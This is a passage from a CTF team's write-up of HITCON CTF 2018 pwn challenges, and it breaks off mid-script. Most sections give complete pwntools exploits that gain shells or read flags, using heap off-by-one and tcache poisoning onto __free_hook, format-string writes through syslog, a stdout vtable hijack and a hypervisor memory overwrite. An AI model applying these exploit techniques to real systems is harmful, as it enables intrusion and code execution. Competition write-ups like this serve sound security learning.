---
title: "hitconctf writeups"
category: "pwn"
subcategory: "format-string"
type: "writeup"
tags: ["pwn", "format-string", "heap", "tcache", "unsorted-bin", "double-free", "off-by-one", "free-hook", "one-gadget", "shellcode", "wasm", "sprintf", "memcpy"]
summary: "BFKinesiS consists of 4 different CTF teams from Taiwan, including Balsn, BambooFox, KerKerYuan and DoubleSigma."
source:
  name: "balsn/ctf_writeup"
  url: "https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20181019-hitconctf/README.md"
ctf:
  name: "hitconctf"
  year: 2018
---

## Source

- **CTF:** hitconctf 2018
- **Repository:** [balsn/ctf_writeup](https://github.com/balsn/ctf_writeup)
- **File:** <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20181019-hitconctf/README.md>

---
# HITCON CTF 2018 Write up

Written by BFKinesiS

BFKinesiS consists of 4 different CTF teams from Taiwan, including [Balsn](https://balsn.tw/), [BambooFox](https://bamboofox.github.io/), KerKerYuan and DoubleSigma. We rank 3rd place in HITCON CTF 2018 among 1118 teams.

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20181019-hitconctf/) of this writeup.**


 - [HITCON CTF 2018 Write up](#hitcon-ctf-2018-write-up)
   - [Pwn](#pwn)
     - [Abyss I](#abyss-i)
     - [Abyss II](#abyss-ii)
     - [Baby Tcache](#baby-tcache)
     - [Children Tcache](#children-tcache)
     - [tftp](#tftp)
     - [HITCON](#hitcon)
       - [leak - first question](#leak---first-question)
       - [second question](#second-question)
     - [Groot](#groot)
       - [Vulnerability](#vulnerability)
       - [Leak](#leak)
       - [Exploit](#exploit)
     - [Secret Note](#secret-note)
       - [Vulnerability](#vulnerability-1)
       - [Thought proccess](#thought-proccess)
       - [Code](#code)
     - [Secret Note v2](#secret-note-v2)
       - [Thought proccess](#thought-proccess-1)
       - [Vulnerability](#vulnerability-2)
       - [Leak](#leak-1)
       - [Exploit](#exploit-1)
       - [Reflection](#reflection)
       - [Code](#code-1)
     - [Super Hexagon](#super-hexagon)
       - [EL0](#el0)
         - [Observation](#observation)
         - [exploit](#exploit-2)
       - [EL1](#el1)
         - [Observation](#observation-1)
         - [exploit](#exploit-3)
   - [Misc](#misc)
     - [EV3 Basic](#ev3-basic)
     - [EV3 Scanner](#ev3-scanner)
     - [Baldis-RE-Basics](#baldis-re-basics)
       - [install](#install)
       - [assemble](#assemble)
       - [disassemble](#disassemble)
       - [emulate](#emulate)
       - [risc-v](#risc-v)
       - [wasm](#wasm)
     - [32 world](#32-world)
     - [tooooo](#tooooo)
   - [Crypto](#crypto)
     - [Lost Modulus](#lost-modulus)
     - [Lost-Key](#lost-key)
       - [leak n](#leak-n)
       - [leak e](#leak-e)
       - [Least Significant <strong>Byte</strong> Oracle Attack](#least-significant-byte-oracle-attack)
   - [Web](#web)
     - [Oh My Raddit](#oh-my-raddit)
     - [Oh My Raddit v2](#oh-my-raddit-v2)
       - [Arbitrary File Read](#arbitrary-file-read)
       - [Browsing source code / issues](#browsing-source-code--issues)
     - [Baby Cake](#baby-cake)
       - [Failed Attempts](#failed-attempts)
       - [Arbitrary File Read](#arbitrary-file-read-1)
       - [phar unserialization to RCE](#phar-unserialization-to-rce)
   - [Reverse](#reverse)
     - [EOP](#eop)



## Pwn
### Abyss I
* NX disable.
* `swap` function doesn't check the index, and the `machine` == `stack[-1]`.

```clike
void swap_()
{
  unsigned int tmp;

  tmp = stack[machine - 1];
  stack[machine - 1] = stack[machine - 2];
  stack[machine - 2] = tmp;
}

```
* We can control the value of `machine` by `swap()`.

```python
p = '31' + 'a' + op['minus']         # -31
p += op['swap']                      # stack point to write.got
p += 'a' + op['store']               # store the high 4 byte
p += str( 2107662 + 70 ) + op['add'] # add offset -> write.got point to our input
p += 'a' + op['fetch']               # recover high 4 byte
p += op['write'],                    # write() to jmp to our shellcode

```
* exploit:

```python
#!/usr/bin/env python
from pwn import *

# hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
# hitcon{take_out_all_memory,_take_away_your_soul}

context.arch = 'amd64'
host , port = '35.200.23.198' , 31733
y = remote( host , port )

kernel = open( './kernel.bin' ).read()

s = '31a-\\a:2107732+a;,' + '\x90' * 70
s += asm(
    shellcraft.pushstr( 'flag\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x70 ) +
    shellcraft.write( 1 , 'rsp' , 0x70 )
)

y.sendlineafter( 'down.' , s )

y.interactive()

```
### Abyss II
* Part of code of `hypercall read handler` in Hypervisor:

```c
rw((unsigned int)fd_map[fd].real_fd, *(_QWORD *)&vm->mem + buf, len);

```
Where `vm->mem` is our vm phisical address. Kernel entry is 0, if we can let `but` == 0, so that  we are able to overwrite the kernel memory. Hypervisor will get the return value of kmalloc().
* `Hypercall read handler`:

```clike
vaddr = *(_DWORD *)(vm->run + *(_QWORD *)(vm->run + 40LL));
if ( (unsigned __int64)vaddr >= vm->mem_size )
     __assert_fail("0 <= (offset) && (offset) < vm->mem_size", "hypercall.c", 0x7Eu, "handle_rw");
arg = (_QWORD *)(*(_QWORD *)&vm->mem + vaddr);
fd = *arg;
buf = arg[1];
len = arg[2];
MAY_INIT_FD_MAP();
if ( fd >= 0 && fd <= 255 && fd_map[fd].opening )
{
    if ( buf >= vm->mem_size )
        __assert_fail("0 <= (paddr) && (paddr) < vm->mem_size", "hypercall.c", 0x83u, "handle_rw");
    read_ret = rw((unsigned int)fd_map[fd].real_fd, *(_QWORD *)&vm->mem + buf, len);
    if ( read_ret < 0 )
        read_ret = -*__errno_location();
}
else
{
    read_ret = -9;
}

```
* Kernel sys_read():

```c
signed __int64 __usercall sys_read@<rax>(__int64 size_@<rdx>, int fd_@<edi>, unsigned __int64 buf@<rsi>)
{
  signed __int64 ret; // rbx
  __int64 l; // r12
  void *vbuf; // rbp
  _QWORD *dst; // r13
  __int64 paddr; // rsi
  __int64 v8; // rcx

  ret = -9i64;
  if ( fd_ >= 0 )
  {
    l = size_;
    vbuf = (void *)buf;
    ret = -14i64;
    if ( (unsigned int)access_ok(size_, 1, buf) )
    {
      dst = (_QWORD *)kmalloc(l, 0);
      paddr = physical((signed __int64)dst);
      ret = (signed int)hyper_read(l, v8, fd_, paddr);
      if ( ret >= 0 )
        qmemcpy(vbuf, dst, ret);
      kfree(dst);
    }
  }
  return ret;
}

__int64 __usercall hyper_read@<rax>(__int64 len@<rdx>, __int64 a2@<rcx>, int fd@<edi>, __int64 buf@<rsi>)
{
  __int64 l; // r12
  _QWORD *vaddr; // rax
  _QWORD *v; // rbx
  unsigned int paddr; // eax
  unsigned int v8; // ST0C_4

  l = len;
  vaddr = (_QWORD *)kmalloc(0x18ui64, 0);
  *vaddr = fd;
  vaddr[1] = buf;
  vaddr[2] = l;
  v = vaddr;
  paddr = physical((signed __int64)vaddr);
  vmmcall(0x8001u, paddr);
  kfree(v);
  return v8;
}

```
* Pass the return value of kmalloc() to hypervisor:

```c
dst = (_QWORD *)kmalloc(l, 0);
paddr = physical((signed __int64)dst);
ret = (signed int)hyper_read(l, v8, fd_, paddr);

```
* Now our goal is to let `kmalloc` return 0 value.
* Kernel kmalloc():

```c
signed __int64 __usercall kmalloc@<rax>(unsigned __int64 len@<rdi>, int align@<esi>)
{
  unsigned __int64 nb; // r8
  signed __int64 now; // rsi
  signed __int64 v4; // rdx
  unsigned __int64 now_size; // rax
  bool equal; // zf
  __int64 next; // rcx
  signed __int64 ret; // rax
  _QWORD *v9; // rcx
  signed __int64 r; // [rsp+0h] [rbp-10h]

  if ( len > 0xFFFFFFFF )
    return 0i64;
  nb = len + 16;
  if ( ((_BYTE)len + 16) & 0x7F )
    nb = (nb & 0xFFFFFFFFFFFFFF80ui64) + 0x80;
  if ( align )
  {
    if ( align != 0x1000 )
      hlt((unsigned __int64)"kmalloc.c#kmalloc: invalid alignment");
    if ( !((0xFF0 - MEMORY[0x4840]) & 0xFFF) || malloc_top((0xFF0 - MEMORY[0x4840]) & 0xFFF) )
    {
      malloc_top(nb);                           // r
      kfree(v9);
      ret = r;
      if ( r )
      {
        if ( !(r & 0xFFF) )
          return ret;
        hlt((unsigned __int64)"kmalloc.c#kmalloc: alignment request failed");
      }
    }
  }
  else
  {
    now = MEMORY[0x4860];
    v4 = 0x4850i64;
    while ( now )
    {
      now_size = *(_QWORD *)now;
      if ( (unsigned __int64)(*(_QWORD *)now - 1i64) > 0xFFFFFFFE || now_size & 0xF )
      {
        hlt((unsigned __int64)"kmalloc.c: invalid size of sorted bin");
LABEL_12:
        *(_QWORD *)(v4 + 16) = next;
        if ( !equal )
        {
          *(_QWORD *)(now + nb) = now_size - nb;
          insert_sorted((_QWORD *)(now + nb));
        }
        ret = now + 16;
        *(_QWORD *)now = nb;
        *(_OWORD *)(now + 8) = 0i64;
        if ( now != -16 )
          return ret;
        break;
      }
      equal = nb == now_size;
      next = *(_QWORD *)(now + 16);
      if ( nb <= now_size )
        goto LABEL_12;
      v4 = now;
      now = *(_QWORD *)(now + 16);
    }
    ret = malloc_top(nb);
    if ( ret )
      return ret;
  }
  return 0i64;
}

```
* There are two conditions that `kmalloc` will return 0.
    * len > 0xffffffff:
    ```c
    if ( len > 0xFFFFFFFF )
        return 0i64;
    ```
    * if kmalloc doesnt find the appropriate chunk in sorted bin, it will allocate from top by `malloc_top`.
    ```c
    ret = malloc_top(nb);
    if ( ret )
      return ret;
    ```
    * If `malloc_top` return 0, it won't return 0 directly, but `kmalloc` will still return 0 in the end.
    ```c
        ret = malloc_top(nb);
        if ( ret )
          return ret;
      }
      return 0;
    }
    ```
* We can not use the condition 1, because if we want to let the `len` to be 0x100000000, we need a memory space exactly has the 0x100000000 long space, due to `access_ok()` checking.
* We can't mmap that huge memory space.
* We have to go condition 2, let `malloc_top` return 0.
* `malloc_top`:

```c
signed __int64 malloc_top(unsigned __int64 nb)
{
  signed __int64 ret; // rax
  __int64 top; // rax
  unsigned __int64 new_top; // rdi

  ret = 0;
  if ( arena.top_size >= nb )
  {
    top = arena.top;
    arena.top_size -= nb;
    arena.top->size = nb;
    new_top = arena.top + nb;
    ret = arena.top + 16;
    arena.top = new_top;
  }
  return ret;
}

```
* Just give a size which lager than `arena.top_size`, it will return 0.
    1. `mmap(0, 0x1000000, 7)` -> `arena.top_size` remain the size < 0x1000000.
    2. `sys_read( 0, buf, 0x1000000 )` -> `kmalloc` in `hypercall read` will return 0.
    3. Pass 0 to hypervisor, `hypercall read handler` will do `read( 0, &vm->mem + 0 , 0x1000000 )`.
    4. Now we can overwrite the whole kernel space! 
* For flag2, I overwrite the opcodes in  kernel `sys_open` which do checking filename with `nop`.
* ORW flag2.
* exploit:

```python
#!/usr/bin/env python
from pwn import *

# hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
# hitcon{take_out_all_memory,_take_away_your_soul}

context.arch = 'amd64'
host , port = '35.200.23.198' , 31733
y = remote( host , port )

kernel = open( './kernel.bin' ).read()

s = '31a-\\a:2107732+a;,' + '\x90' * 70
s += asm(
    '''
    mov rdi, 0
    mov rsi, 0x1000000
    mov rdx, 7
    mov r10, 16
    mov r8, -1
    mov r9, 0
    mov rax, 8
    inc rax
    syscall

    mov rbp, rax
    push rsp
    ''' +
    shellcraft.write( 1 , 'rsp' , 8 ) + 
    shellcraft.read( 0 , 'rbp' , 0x1000000 ) +
    shellcraft.pushstr( 'flag2\x00' ) + 
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x70 ) +
    shellcraft.write( 1 , 'rsp' , 0x70 )
)

y.sendlineafter( 'down.' , s )
y.recvline()
user_stack = u64( y.recv(8) )
success( 'User stack -> %s' % hex( user_stack ) )

kernel_mod = kernel[:0x14d] + p64( 0x8002000000 ) + p64( user_stack + 0x100 )
kernel_mod += kernel[0x15d:0x9a4] + '\x90' * 0x75

sleep(1)
y.send( kernel_mod )

y.interactive()

```

### Baby Tcache

Off-by-one null byte on heap.
Overwrite next chunck inuse bit and set proper pre_size.
Free next chunck and  it will merge to previous chunck.
At this point, there is a overlap large unsorted bin.
Free one 0x20 chunck and malloc property size.
Let unsorted bin fd overwrite tcache fd.
Partially ovewrite last two bytes to  tcache fd point to `_IO_2_1_stdout_`.
Then, you can malloc a address at `_IO_2_1_stdout_`.
Properly modify the value of `_IO_2_1_stdout_`.

* Set _flag = 0x800
* Overwrite last byte of write_base to zero
* _IO_read_end eqaul to _IO_write_base

```clike=
file = {
    _flags = 0xfbad2887,
    _IO_read_ptr = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n",
    ...

```
Beacause we don't know libc address, we partially ovewrite last byte of _IO_read_base.
Thanks to off-by-one, I can overwrite last byte of _IO_write_base to zero.
Next time call puts. It will print from _IO_write_base and leak libc address.

Malloc 0x100, there are two heap with same address.
Double free the same address and modify the fd to `__free_hook`.
Modify `__free_hook` value to `one_gadget` and get shell.

```python=
from pwn import *

#r = process(["./baby_tcache"])
r = remote("52.68.236.186", 56746)
def add(size,data):
        r.sendlineafter("choice:","1")
        r.sendlineafter(":",str(size))
        r.sendafter(":",data)

def remove(idx):
        r.sendlineafter("choice:","2")
        r.sendlineafter(":",str(idx))

add(0x500,"a") #0
add(0x20,"a")  #1
add(0x20,"a")  #2
add(0x4f0,"a")  #3
add(0xf0,"a")  #4
remove(2)
add(0x28,"a"*0x20+p64(0x570)) #2
remove(0)
remove(3)
remove(1)
add(0x500,"a") #0
add(0x100,p16(0x4760)) #1
add(0x20,"a") #3
add(0x20,p64(0x800)+"\x00"*0x9) #5

data = r.recvuntil("$")
libc = u64(data[8:16])-0x3ed8b0
print hex(libc)
remove(3)
remove(1)
add(0x100,p64(libc+0x3ed8e8))
add(0x100,p64(0x1234))
add(0x100,p64(libc+0x4f322))
remove(0)
r.interactive()

```

### Children Tcache
strcpy will cause off-one-byte null byte.
Beacause of the null terminating, we can't set pre_size and inuse bit at same time.
So we first set inuse bit of the next chunck.
Repeat free and malloc to fix pre_size to the correct value.
Free next chunck and get a overlapping unsorted bin.
Malloc a proper size to let unsorted bin fd overwrite to one heap content.
Call `Show heap` to leak libc address.

Malloc 0x30, there are two heap with same address.
Double free the same address and modify the fd to `__free_hook`.
Modify `__free_hook` value to `one_gadget` and get shell.


```python=
from pwn import *

#r = process(["./children_tcache"])
r = remote("54.178.132.125", 8763)
def add(size,data):
        r.sendlineafter("choice:","1")
        r.sendlineafter(":",str(size))
        r.sendafter(":",data)

def show(idx):
        r.sendlineafter("choice:","2")
        r.sendlineafter(":",str(idx))

def remove(idx):
        r.sendlineafter("choice:","3")
        r.sendlineafter(":",str(idx))

add(0x500,"a") #0
add(0x20,"a")  #1
add(0x20,"a")  #2
add(0x4f0,"a") #3
add(0x20,"a") #4

remove(2)
add(0x28,"a"*0x28) #2
remove(2)
add(0x27,"a"*0x27) #2
remove(2)
add(0x26,"a"*0x26) #2
remove(2)
add(0x25,"a"*0x25) #2
remove(2)
add(0x24,"a"*0x24) #2
remove(2)
add(0x23,"a"*0x23) #2
remove(2)
add(0x22,"a"*0x20+p16(0x570)) #2
remove(0)
remove(3)
add(0x500,"a") #0
show(1)
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x3ebca0
print hex(libc)

add(0x30,"a")
remove(1)
remove(3)
add(0x30,p64(libc+0x3ed8e8))
add(0x30,"a")
add(0x30,p64(libc++0x4f322))
remove(1)


r.interactive()

```
### tftp
There is a format string vulnerability when mode is unknown.
Beacuse syslog take second parameter as a format string.
Now we have a arbitrarily write.

```clike=
  ...
    sprintf((char *)(v32 + 348), "unknown mode %s", *(_QWORD *)(v32 + 288));
    qmemcpy(&v30, (const void *)(v32 + 344), 0x200uLL);
    sub_400E9F((unsigned __int64)&v31, v32 + 88);
    syslog(3, (const char *)(v32 + 348));
    sub_400EF0(v32);
    return 1LL;
  ...

```
Because of no PIE, we can modify `dest` and `buf` without knowing code base.
We can craft a structure on .bss and `dest` point to it.
We also make `buf` point to near the structure we create.
So we can take input and craft the structure at the same time.
Use opcode 0x4 to leak libc by properly craft the structure.

```clike=
...
else if ( *((_DWORD *)dest + 79) > 3 &&
    ntohs(*((_WORD *)buf + 1)) == *((_WORD *)dest + 156) )
{
    ++*((_WORD *)dest + 156);
    ++*((_DWORD *)dest + 77);
    sub_4011D0(dest, v3);
}

```
sub_4011D0

```clike=
...
if ( ntohs(*(_WORD *)(*(_QWORD *)(dest + 328) + 2LL)) 
    == *(_WORD *)(dest + 312) )
{
    *_errno_location() = 0;
    write(1, *(dest + 328), *(dest + 320) + 4); // arbitrarily read
    ...
}

```
Because the libc version is 2.23, we can modify stdout vtable to anywhere.
We create a vtable where at offest 0x38 is system address.
Modify stdout vtable to vtable we create.
Modify stdout flag to 0x6873("sh").
Wait 60 second to trigger alarm handler to call puts.
It will call system("sh") to get shell.




```python=
from pwn import *

context.arch = "amd64"

r = process(["./tftp"])
#r = remote("52.68.37.204", 48763)
dest = 0x604a00
def write(addr,val):
        r.send("\x00\x02\x30\x00%{}c%157$n\x00".format(addr-0xd))
        r.recvrepeat(.1)
        r.send("\x00\x02\x30\x00%{}c%158$n\x00".format(val-0xd))
        r.recvrepeat(.1)

def write_byte(addr,val):
        r.send("\x00\x02\x30\x00%{}c%157$n\x00".format(addr-0xd))
        val -= 0xd
        if val <= 0:
                val+=0x100
        r.recvrepeat(.1)
        r.send("\x00\x02\x30\x00%{}c%158$hhn\x00".format(val))
        r.recvrepeat(.1)


write_byte(0x604001,0x1)
write(0x604030,dest-0x50)
write(0x604038,dest)

data = [0]*0x30
data[0] = 1
data[0x29] = 0x604000-2
data[0x28] = 0x16

r.send("\x00\x04\x00\x00".ljust(0x50,'\x00')+flat(data))
r.recvn(0x12)
libc = u64(r.recvn(8))-0x3c5620
print hex(libc)
one_gadget = libc+0x45390

write(0x604c00,one_gadget&0xffffff)
write(0x604c03,one_gadget>>24)
write(0x604bc8,0x6873)

value = 0x10
fmt = "%{}c%66$n".format(value-0xd)
fmt = fmt.ljust(15,"0")
addr = libc+0x3c56f8+3
payload = "\x00\x02\x30\x00" + fmt + p64(addr)
r.send(payload)
r.recvrepeat(.1)
value = 0x604c00-0x38
fmt = "%{}c%66$n".format(value-0xd)
fmt = fmt.ljust(15,"0")
addr = libc+0x3c56f8
payload = "\x00\x02\x30\x00" + fmt + p64(addr)
r.send(payload)
r.recvrepeat(.1)

value = 0x6873
fmt = "%{}c%66$n".format(value-0xd)
fmt = fmt.ljust(15,"0")
addr = libc+0x3c5620
payload = "\x00\x02\x30\x00" + fmt + p64(addr)
r.send(payload)
r.recvrepeat(.1)
r.interactive() # wait 60 second to get shell

```

### HITCON


The program is a simulated HITCON conference.

we can arrange the session like this

```
----------------------------------------
|     R0     |     R1     |     R2     |
----------------------------------------
| Beelzemon  | Armagemon  |   Jesmon   |
----------------------------------------
|  Angelboy  | david942j  |   Orange   |
----------------------------------------
| Apocalymon |  Omnimon   | Chronomon  |
----------------------------------------

```

I tested that there are four speakers can let us ask questions.  

nice speaker
1.david942j
2.Angelboy
3.Orange
normal speaker
4.Jesmon

A nice audience will go to a nice speaker's room first.
If there are any speaker can let audience ask question, nice audience will answer first.
It's multi-thread program. I spent a long time looking for race condition or asking for three questions but I couldn't find it.

Later, I found out that I can solve the ask twice.

```
----------------------------------------
|     R0     |     R1     |     R2     |
----------------------------------------
| Beelzemon  | Armagemon  |   Jesmon   |
----------------------------------------
|  Angelboy  | david942j  |   Orange   |
----------------------------------------
| Apocalymon |  Omnimon   | Chronomon  |
----------------------------------------

```
There are two chance to ask questions
The vulnerability is in the input data when I asked.
The input data can overflow the question buffer through strlen and strncpy functions.

#### leak - first question
We can cover the lowest byte of the pointer and we can get the thread stack address.

```
0x00007f48b0bf0000 0x00007f48b0bf1000 ---p      mapped
0x00007f48b0bf1000 0x00007f48b13f1000 rw-p      mapped   <------------------   get this address
0x00007f48b13f1000 0x00007f48b13f2000 ---p      mapped
0x00007f48b13f2000 0x00007f48b1bf2000 rw-p      mapped
0x00007f48b1bf2000 0x00007f48b1bf3000 ---p      mapped
0x00007f48b1bf3000 0x00007f48b23f3000 rw-p      mapped
0x00007f48b23f3000 0x00007f48b240a000 r-xp      /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f48b240a000 0x00007f48b2609000 ---p      /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f48b2609000 0x00007f48b260a000 r--p      /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f48b260a000 0x00007f48b260b000 rw-p      /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f48b260b000 0x00007f48b27a8000 r-xp      /lib/x86_64-linux-gnu/libm-2.27.so
0x00007f48b27a8000 0x00007f48b29a7000 ---p      /lib/x86_64-linux-gnu/libm-2.27.so
0x00007f48b29a7000 0x00007f48b29a8000 r--p      /lib/x86_64-linux-gnu/libm-2.27.so
0x00007f48b29a8000 0x00007f48b29a9000 rw-p      /lib/x86_64-linux-gnu/libm-2.27.so
0x00007f48b29a9000 0x00007f48b2b90000 r-xp      /home/tens/CTF/2018/HITCON/pwn/hitcon/libc.so.6
0x00007f48b2b90000 0x00007f48b2d90000 ---p      /home/tens/CTF/2018/HITCON/pwn/hitcon/libc.so.6
0x00007f48b2d90000 0x00007f48b2d94000 r--p      /home/tens/CTF/2018/HITCON/pwn/hitcon/libc.so.6
0x00007f48b2d94000 0x00007f48b2d96000 rw-p      /home/tens/CTF/2018/HITCON/pwn/hitcon/libc.so.6

```
Now we have thread stack and libc address.

#### second question
When we ask the question, we can override a pointer so that we got a arbitrarily write. 
We override the input name function return address so we can control rip.
Covered into one_gadget to get shell.


```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '13.115.73.78'
port = 31733

binary = "./hitcon"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def Schedule(t ,Author):
  r.recvuntil(" Exit\n")
  r.sendline("3")
  time.sleep(0.01)
  r.sendline(str(t) + " " + str(Author))
  time.sleep(0.01)
  r.sendline("0 0")

def start():
  r.recvuntil(" Exit\n")
  r.sendline("4")

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':

  da = 1
  orange = 4
  angel = 7
  leak = 9

  Schedule(3,leak)
  Schedule(2,8)
  Schedule(1,2)

  Schedule(4,angel)
  Schedule(5,da)
  Schedule(6,orange)

  Schedule(7,5)
  Schedule(8,3)
  Schedule(9,6)
  start()
  
  r.recvuntil("go?\n")
  r.sendline("2")
  r.recvuntil("Any questions?\n")

  r.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaa@")
  r.recvuntil("alaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaa")
  addr = u64(r.recv(6).ljust(8,"\x00"))
  print("addr = {}".format(hex(addr)))
  libc = addr  + 0x15b88c0
  print("libc = {}".format(hex(libc)))
  if (libc & 0xfff) != 0:
    print("fuck libc")
    r.close()
    exit()
  magic = libc+0x0010A38C
  print("magic = {}".format(hex(magic)))
  r.sendline("")
  time.sleep(1)
  #raw_input("@")
  r.sendline("0")
  r.recvuntil("Any questions?\n")
  ret_addr = libc - 0x15b9248
  r.sendline("D"*91 + p64(ret_addr + 0x90))
  time.sleep(0.1)
  r.sendline(p64(magic))
  r.interactive()


```

### Groot

#### Vulnerability
* Uninitialized pointer on children
Creating a directory with `mkdir` does not set children to null. Normally this does not have effect because the `rm` command clears the children field of the deleted directory. However when deleting a nested directory like `./a/b/c`, it actually only clears the children field of `a`, letting `b` and `c` removed but with the children field unchecked.
What this does is the next time we use `mkdir` the directory created has inherently a children pointing to `c`, leading to a UAF vulnerability.

#### Leak
* Heap address
    * Leaking heap address is pretty straight forward.

```
mkdir 'a'*0x38
cd 'a'*0x38
mkdir 'a'*0x38
cd 'a'*0x38
mkdir 'a'*0x38
cd ../../
rm 'a'*0x38
mkdir a
ls a

```
* Libc address
    * Leaking libc address is a lot more complex. Because the biggest size we can allocate is in fastbin range.
    * The idea is to first create a UAF pointer like above.
    * Exhaust the top chunk to trigger malloc consolidate. This will create libc address on the heap.
    * Make the libc address be on the UAF pointer some how some way.
    * Note that the free chunk where the UAF pointer is pointed can't be allocated during the proccess above. Therefore, it's super complex and even I can't explain how I did it... QAQ
    * Also, `ls` allocates a chunk and doesn't free it, so it can be used to exhaust heap. I discovered this pretty late, so I used both `mkfile` and `ls` to exhaust heap. The code is pretty messy because of this...

#### Exploit
* With libc, heap address and UAF, it's not too hard to exploit using tcache.

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('127.0.0.1', 7123)
lib = ELF('./libc.so.6')

def cmd(data):
    r.sendlineafter('$', data)

def mkfile(name, data):
    cmd('mkfile '+name) 
    r.sendlineafter('Content?', data)
def mkdir(name):
    cmd('mkdir '+name)
def cd(name):
    cmd('cd '+name)
def rm(name):
    cmd('rm '+name)
def ls(name):
    cmd('ls '+name)
def cat(name):
    cmd('cat '+name)

# leak
mkdir('a'*0x38)
cd('a'*0x38)
mkdir('a'*0x38)
cd('a'*0x38)
mkdir('a'*0x38)
cd('../../')
# UAF
rm('a'*0x38)
mkdir('a')
ls('a')
x = r.recvline().split()[2][:-4]
heap = u64(x.ljust(8, '\x00')) - 0x12d40
print 'heap: 0x%x' % heap

# cleanup
mkdir('b'*0x38)
cd('b'*0x38)
mkdir('b'*0x38)
cd('b'*0x38)
mkdir('b'*0x38)
cd('../../')


# exhaust heap & pad
mkdir('tmp')
cd('tmp')
for i in range(370):
    mkfile(str(i), 'a')
cd('..')
#raw_input("@")

libc_addr = heap + 0x20c00
print 'libc addr at: 0x%x' % libc_addr
# fill tache
# create small bin
'''
for i in range(43):
    mkfile(str(i), 'a')
'''
for i in range(43, 50):
    mkfile(str(i), 'a'*0x48)
for i in range(43):
    rm(str(i))
mkdir('DIR')
cd('DIR')
mkdir('DIR')
cd('DIR')
mkfile('1', '1'*0x48)
cd('../..')
for i in range(43, 50):
    rm(str(i))
for i in range(7):
    cmd('ls '.ljust(0x30, 'a'))
rm('DIR')
#for i in range(43, 50):
    #mkfile(str(i), 'a'*0x48)

#r.interactive()

mkdir('DIR')
cd('DIR')
mkdir('DIR2')
cd('..')

for i in range(0xcd):
    ls('flag')
rm('tmp/1')
rm('tmp/2')
cmd('ls '.ljust(0x63, 'a'))
cat('DIR/DIR2/DIR2')

x = r.recvuntil('$ ')
x = r.recvuntil('$ ', drop=True)
print repr(x)
libc = u64(x.ljust(8, '\x00')) - 0x3dacc8
print 'libc: 0x%x' % libc
raw_input("@")
#cmd('ls '.ljust(0x63, 'a'))

# clear arena
r.sendline('A'*0x10)
ls('A'*0x10)
for i in range(3):
    ls('A'*0x30)
for i in range(8):
    ls('A'*0x50)

# exploit
mkdir('JIZZ')
cd('JIZZ')
for i in range(10):
    mkdir('J')
    cd('J')
for i in range(10):
    cd('..')
cd('..')
rm('JIZZ')
mkdir('JIZZ')
rm('JIZZ/JIZZ')
ls('a')
ls('a')
__free_hook = libc + 0x3dc8a8
system = libc + 0x47dc0
#ls(flat(__free_hook-0x10+5-8)[:-1])
ls(flat(__free_hook-0x10)[:-1])
ls('a')
ls('a')
ls(flat(system))
mkfile('sh', '/bin/sh')
rm('sh')


r.interactive()

```

### Secret Note

#### Vulnerability
* Heap overflow
There is a heap overflow of 12 bytes when adding a note of AES with length multiple of 16. However, the length and content couldn't be controlled.

#### Thought proccess
* The heap overlay is as follows:

```
+-------------+
| flag1 & key |
|-------------|
|             |
|    a big    |
|   unsorted  |
|    chunk    |
|             |
+-------------+
|      N      |
+-------------+

```
* If we just trigger the overflow right away, the proccess will crash on the next allocation since the unsorted bin's `size` and `fd` are corrupted.
* The idea is to exhaust the `unsorted bin` and overflow the `N`. By doing this we could get `pow(key, 217, N)` on multiple `N`s and therefore use CRT to get the `key`.
* However, the trouble is that we could only `malloc` a limited amount of notes, and they are not enough to exhaust the `unsorted bin`.
* After several hours of trying, we discovered that `calloc` actually **DOES NOT** allocate from `tcache`, but freeing a calloced chunk put it in `tcache`! Wuuuuuuut!?
* Therefore, we can use `show note` to exhaust the `unsorted bin`, overflow the `N`, print the encrypted `key`, do this several times, run CRT on them, and get the `key`.
* After getting the `key`, just print the `flag1` and decrypt it :)

#### Code
* Overflow N

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
from tqdm import trange
import pickle

f = open('pickle', 'wb')
a = []
for N in range(100):
    r = remote('52.194.203.194', 21700)

    def add(idx, typ, sz, data):
        r.sendlineafter('exit', '1')
        r.sendlineafter('index:', str(idx))
        r.sendlineafter('type:', str(typ))
        r.sendlineafter('size:', str(sz))
        r.sendafter('Note:', data)

    def show(idx):
        r.sendlineafter('exit', '2')
        r.sendlineafter('index:', str(idx))
        return r.recvline()

    def delete(idx):
        r.sendlineafter('exit', '3')
        r.sendlineafter('index:', str(idx))

    add(2, 1, 0x30, 'a'*0x30)
    for i in range(3, 7):
